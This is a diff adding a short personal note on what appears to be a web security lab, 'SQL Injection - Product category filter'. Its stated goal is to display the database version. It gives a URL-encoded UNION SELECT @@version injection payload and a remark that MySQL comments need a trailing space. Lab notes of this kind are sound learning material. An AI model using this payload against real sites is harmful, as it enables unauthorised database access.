@@ -1,0 +1,6 @@
+SQL Injection - Product category filter
+
+Goal: Display the database version
+
+Process:
+'+UNION+SELECT+@@version,+NULL--+ -> Every comment must in MySQL must be followed by a space.
